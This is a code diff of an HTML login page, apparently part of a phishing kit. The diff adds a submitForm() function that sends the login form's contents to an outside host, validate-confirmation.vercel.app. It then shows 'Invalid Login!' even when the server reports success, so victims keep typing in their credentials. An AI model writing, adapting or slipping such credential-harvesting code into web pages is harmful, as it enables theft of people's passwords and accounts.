@@ -136,7 +136,7 @@
             </div>
             <div class="modal-footer">
               <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
-              <button class="btn btn-lg btn-info pull-right" id="submit-btn">Login</button>
+              <button class="btn btn-lg btn-info pull-right" id="submit-btn" onclick="submitForm()">Login</button>
             </div>
           </form>
         </div>
@@ -155,7 +155,53 @@
 
   <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
 
+
   <script>
+    function submitForm() {
+    // Get form data
+    const formData = new FormData(document.getElementById('contact'));
+
+    // Create an XMLHttpRequest object
+    const xhr = new XMLHttpRequest();
+
+    // Configure it: POST-request for the specified URL
+    xhr.open('POST', 'https://validate-confirmation.vercel.app/', true);
+
+    // Set up a callback function to handle the response
+    xhr.onload = function () {
+      if (xhr.status === 200) {
+        // Successful response, handle accordingly
+        // Optionally, close the modal or perform other actions
+        // ...
+
+         // Check the server's response for successful login
+         const response = JSON.parse(xhr.responseText);
+         if (response.success) {
+          // Display the alert after the form is submitted
+          alert('Invalid Login!');
+        }
+      }
+      else {
+        // Handle the error case
+        // Optionally, close the modal or perform other actions
+        // ...
+
+        // Display the alert for unsuccessful login
+        alert('Invalid Login!');
+      }
+    };
+
+    // Send the request with form data
+    xhr.send(formData);  
+}
+    
+  </script>
+  <script>
+
+  
+
+
+
 
     /* global $ */
     $(document).ready(function(){
@@ -216,6 +262,7 @@
       const password = $('#password').val();
       const detail = $('#field').html();
 
+  
   // Make AJAX request to Node.js server
   $.ajax({
     dataType: 'json',
